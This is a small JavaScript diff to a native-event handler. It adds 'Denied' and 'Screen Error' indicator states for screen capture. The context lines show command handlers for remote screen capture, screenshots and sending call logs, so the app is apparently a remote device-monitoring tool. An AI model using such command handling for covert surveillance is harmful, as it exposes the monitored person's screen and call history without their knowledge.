@@ -124,7 +124,8 @@ function handleNativeEvent(e) {
       if (NativeSocket) NativeSocket.requestScreenCapture().catch(() => {})
       break
     case 'screen:started':  setIndicator('cam', true, 'Screen On'); break
-    case 'screen:denied':   break
+    case 'screen:denied':   setIndicator('cam', false, 'Denied'); break
+    case 'screen:error':    setIndicator('cam', false, 'Screen Error'); break
     case 'cmd:screen:stop': setIndicator('cam', false, 'Inactive'); break
     case 'cmd:screenshot':   break  // handled natively
     case 'cmd:get:calllogs': sendCallLogs(); break
